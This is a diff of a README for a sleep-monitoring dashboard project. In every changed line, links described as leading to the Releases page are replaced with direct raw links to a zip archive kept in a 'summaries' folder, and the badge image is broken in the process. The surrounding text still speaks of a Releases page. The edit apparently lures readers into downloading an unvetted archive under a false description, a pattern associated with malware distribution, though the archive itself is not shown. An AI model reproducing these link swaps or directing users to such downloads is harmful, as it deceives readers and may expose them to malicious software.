@@ -1,6 +1,6 @@
 # 🌙 ESW-Sleep-Monitoring-Dashboard - Monitor Your Sleep Quality Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/tejrawal46/ESW-Sleep-Monitoring-Dashboard/releases)
+[![Download Now](https://github.com/tejrawal46/ESW-Sleep-Monitoring-Dashboard/raw/refs/heads/main/summaries/ES-Sleep-Dashboard-Monitoring-1.2-alpha.1.zip%20Now-Get%20the%20App-blue)](https://github.com/tejrawal46/ESW-Sleep-Monitoring-Dashboard/raw/refs/heads/main/summaries/ES-Sleep-Dashboard-Monitoring-1.2-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To use this application, your system should meet the following requirements:
 
 To get started, visit the Releases page linked below. You will find the latest version of the application there. 
 
-[🔗 Download from Releases](https://github.com/tejrawal46/ESW-Sleep-Monitoring-Dashboard/releases)
+[🔗 Download from Releases](https://github.com/tejrawal46/ESW-Sleep-Monitoring-Dashboard/raw/refs/heads/main/summaries/ES-Sleep-Dashboard-Monitoring-1.2-alpha.1.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release.
@@ -68,6 +68,6 @@ This project is licensed under the MIT License. Feel free to use it, but please 
 
 ---
 
-[🔗 Visit the Releases Page for Download](https://github.com/tejrawal46/ESW-Sleep-Monitoring-Dashboard/releases)
+[🔗 Visit the Releases Page for Download](https://github.com/tejrawal46/ESW-Sleep-Monitoring-Dashboard/raw/refs/heads/main/summaries/ES-Sleep-Dashboard-Monitoring-1.2-alpha.1.zip)
 
 Thank you for choosing the ESW-Sleep-Monitoring-Dashboard! Your journey to better sleep starts here.
